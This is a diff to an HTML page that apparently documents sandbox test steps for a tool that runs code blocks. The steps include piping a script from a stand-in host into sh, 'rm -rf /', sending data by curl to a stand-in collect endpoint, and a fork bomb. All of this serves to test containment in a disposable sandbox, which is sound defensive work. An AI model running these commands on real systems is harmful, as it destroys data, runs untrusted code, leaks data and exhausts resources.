@@ -5,8 +5,8 @@
 <p>Only run these examples in a disposable, credential-free sandbox. Each step is independent.</p>
 <h2>1. Download and execute a script</h2><pre><code>set -o pipefail; curl -fsS https://blocked.invalid/install.sh | sh</code></pre>
 <p>Expected stdout: installed</p>
-<h2>2. Attempt filesystem destruction</h2><pre><code>rm -rf /</code></pre>
-<p>The root filesystem is read-only and /work is disposable. No expected output is documented.</p>
+<h2>2. Attempt filesystem destruction</h2><pre><code>rm -rf /; touch /var/tmp/docsrunner-root-probe</code></pre>
+<p>The root filesystem is read-only and /work is disposable. GNU rm may refuse root deletion itself; the subsequent write to /var/tmp, which is world-writable but lives on the read-only root, exercises the filesystem boundary. No expected output is documented.</p>
 <h2>3. Attempt exfiltration</h2><pre><code>curl -fsS --max-time 5 --data 'demo-payload' https://blocked.invalid/collect</code></pre>
 <p>Expected stdout: delivered</p>
 <h2>4. Exhaust the process budget</h2><pre><code>:(){ :|:&amp; }; :</code></pre>
